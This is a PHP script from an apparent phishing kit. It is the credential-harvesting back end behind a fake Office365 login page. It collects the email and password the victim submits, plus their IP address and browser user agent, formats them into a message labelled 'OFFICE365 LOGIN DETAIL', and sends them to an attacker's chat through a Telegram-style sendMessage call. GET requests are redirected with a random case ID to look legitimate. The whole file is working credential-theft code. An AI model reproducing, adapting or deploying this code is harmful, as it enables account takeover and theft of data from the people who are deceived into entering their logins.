<?php

session_start();
error_reporting(0);
include 'ajax/Config.php';
include 'ajax/Functions.php';
include 'ajax/Cors.php';

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$usr = $_POST['email'];
$pss = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

if (!preg_match('/[^\x20-\x7E]/', $usr) && !preg_match('/[^\x20-\x7E]/', $pss)) {
  // Encode message content
  $usr = htmlentities($usr);
  $pss = htmlentities($pss);

  // Debugging: Print out message content
  var_dump($usr);
  var_dump($pss);

  if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $TKRand = md5(uniqid(rand(), true));
    header("Location: ../?Case_id=" . $TKRand);
    exit();
  }

  // Simplified message content
  $msg = "💵 OFFICE365 LOGIN DETAIL\n"
    . "📧 EMAIL:  " . $usr . "\n"
    . "🔑 PASSWORD:  " . $pss . "\n"
    . "🛡 IP: " . $ip . "\n"
    . "👱🏿 USER-AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

  try {
    $response = sendBox('sendMessage', [
      'chat_id' => $chat_id,
      'text' => $msg
    ]);

    var_dump($response);

    // Check if the response indicates success
    if ($response['ok']) {
      echo "Message sent successfully.";
    } else {
      echo "Failed to send message. Error: " . $response['description'];
    }
  } catch (RuntimeException $e) {
    echo "An error occurred: " . $e->getMessage();
  }

  $key = substr(sha1(mt_rand()), 1, 25);
} else {
  echo "Message contains special characters. Please remove them before sending.";
}

exit();
?>